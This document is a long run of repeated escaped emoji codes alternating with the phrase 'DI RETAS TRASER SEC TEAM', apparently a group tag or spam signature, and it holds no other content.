\ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf DI RETAS TRASER SEC TEAM \ud83e\uddd1\u200d\ud83e\uddaf",
